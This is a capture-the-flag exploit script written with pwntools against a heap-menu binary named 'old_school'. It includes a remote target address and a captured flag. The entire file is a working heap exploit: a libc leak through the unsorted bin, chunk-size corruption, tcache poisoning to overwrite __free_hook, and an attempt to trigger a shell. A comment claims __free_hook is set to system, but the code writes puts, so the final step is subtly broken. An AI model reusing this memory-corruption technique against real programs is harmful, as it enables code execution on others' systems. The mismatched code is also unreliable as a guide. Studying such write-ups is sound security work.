from pwn import *
context.arch = 'amd64'
# context.log_level = "debug"
IP = "121.36.194.21"
PORT = 49154
DEBUG = 1


if DEBUG:
    p = process(["./ld.so", "./old_school"], env={"LD_PRELOAD": "./libc-2.27.so"})
    # p = process("./old_school")
    libc = ELF("./libc-2.27.so")
    # attention: argv[1] for ./pwn when running with ./ld.so ./pwn
    base = p.libs()[p._cwd + p.argv[1].decode().strip('.')]  # fix bytes str error in py3.9
    print("base:", base, p.libs())

else:  # flag{m0lWJAzDB1vzxMn9PlMQXkPvEmGAdZzB}
    p = remote(IP, PORT)
    libc = ELF("./libc-2.27.so")


def ru(x): return p.recvuntil(x)
def se(x): return p.send(x)
def rl(): return p.recvline()
def sl(x): return p.sendline(x)
def rv(x): return p.recv(x)
def sa(a, b): return p.sendafter(a, b)
def sla(a, b): return p.sendlineafter(a, b)
def l64(): return u64(p.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))  # python 3.9 pass


def debug(cmd=""):
    gdb.attach(p, cmd)


def dd():
    if DEBUG:
        cmd = ""
        # cmd += "b *%d\n" % (base + 0xC0E)  #
        cmd += "set $a=%d\n" % (base + 0x202160)  # arrPtr
        debug(cmd)


def new(idx, size):
    sla("Your choice: ", str(1))
    sla("Index: ", str(idx))
    sla("Size: ", str(size))
    ru("Done!")


def edit(idx, content):
    sla("Your choice: ", str(2))
    sla("Index: ", str(idx))
    sa("Content: ", content)


def printnote(idx):
    sla("Your choice: ", str(3))
    sla("Index: ", str(idx))
    ru("Content: ")
    return ru("1. New note")[:-12]


def delete(idx):
    sla("Your choice: ", str(4))
    sla("Index: ", str(idx))


new(0, 0x18)  # no use
new(1, 0x18)  # no use

edit(1, "chunk1".ljust(0x10, 'a') + '\n')
# === Step-1: full tcache, a chunk to unsorted bin
new(2, 0x98)
for i in range(3, 10, 1):
    new(i, 0x98)  # 3~9
for i in range(9, 2, -1):
    delete(i)  # 9~3 # full tcache
delete(2)  # to unsorted_bin
# tcache(0xa0) cnt=7: c3, c4, c5 ... c9 # unsorted_bin cnt=1: 0xa0

# === Step-2: get back a chunk in unsorted bin, leak libc addr
new(2, 0x78)  # get a chunk(0x81) from unsorted_bin #拿回 unsorted_bin 的chunk
data = printnote(2)  # leak libc addr # 泄露刚刚拿回来的chunk上残留的libc上的地址
libc.address = u64(data.ljust(8, b"\x00")) - 0x7fd552399d30 + 0x00007fd551fae000
print("data:", data)
print("libc.address:", libc.address, hex(libc.address))

# tcache(0xa0) cnt=7: c3, c4, c5 ... c9 # unsorted_bin cnt=1: 0x20
# === Step-3: edit the rest chunk's size in unsorted_bin
edit(2, "chunk2".ljust(0x78, 'a') + chr(0x61))  # cover size to 0x61
# tcache(0xa0) cnt=7: c3, c4, c5 ... c9 # unsorted_bins cnt=1: 0x60

new(3, 0x58)  # malloc the chunk in unsorted bin
# cover fw of head chunk in tcache
edit(3, b"chunk3".ljust(0x18, b'a') + p64(0xa0) + p64(libc.symbols["__free_hook"]) + b'\n')
# tcache(0xa0) cnt=7: head_chunk, &__free_hook
new(4, 0x98)  # tcache(0xa0) cnt=6: &__free_hook
edit(4, "/bin/sh\x00\n")
new(5, 0x98)  # get &__free_hook
edit(5, p64(libc.symbols["puts"]) + b'\n')  # cover __free_hook with system
delete(4)  # system("/bin/sh\x00\n")
dd()

p.interactive()
